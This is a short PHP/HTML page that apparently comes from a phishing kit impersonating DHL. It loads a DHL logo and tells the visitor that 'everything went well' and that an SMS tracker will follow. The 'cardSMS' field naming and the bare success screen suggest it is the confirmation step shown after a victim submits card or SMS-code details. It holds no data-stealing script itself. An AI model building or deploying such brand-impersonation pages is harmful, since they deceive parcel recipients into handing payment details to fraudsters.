<?php



?>
<style>
.c-nav--logo{
    margin-top: 50px;
    margin-left: 50px;
}

    </style>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Everything went well! Expect an SMS message within 4 hours with an up-to-date tracker.</title>
    <link rel="stylesheet" href="assets/style.css"/>
</head>
<body>
<header class="">
      <div class="headeriparsys iparsys parsys">
        <div class="iparys_inherited">
          <div id="navigation-primary" class="l-header c-navigation js--navigation">
            <nav class="c-nav l-grid">
              <div class="c-nav-primary--meta-container l-grid l-grid--w-100pc-m">
                <div>
                  <a href=""
                    class="c-nav--logo ">
                    <img  class="c-nav--logo" src="./index_files/dhl-logo.svg" alt="Back to Home">
                  </a>
                </div>
              </div>
           
              <ul
                class="c-nav--mobile js--nav-mobile l-grid--right-s l-grid--w-80pc-m l-grid--visible-s l-grid--hidden-m">
                <li>
                  <a class=""
                    href="">
                    <!-- <span class="sr-only">Search</span> -->
                  </a>
                </li>
                <li
                  class="c-nav--button type--menu js--mobile-toggle js--nav-mobile-item l-grid l-grid--left-s has-subnav js--has-subnav"
                  data-level-init="1">
                  <div class="c-nav--menu-icon">
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                  </div>
                </li>
              </ul>
            </nav>
          </div>
        </div>
      </div>
    </header>
  <div class="container">
      <div class="title-block">
        
          <h2 class="title">Everything went well! Expect an SMS message within 4 hours with an up-to-date tracker.</h2>

      </div>
                <div class="form-row">
                    <div class="form-item">
                        <label for="cardSMS"></label>
                    </div>
                </div>
                <br> <br> <br>
                <!-- <div class="form-footer">
                    <p class="security">
                        <img src="assets/loading.gif" alt="" width="100">
                    </p>
                </div> -->
  </div>
  
  
      <script type="text/javascript">



    </script>
  
 
  
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>-->
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>-->
</body>
</html>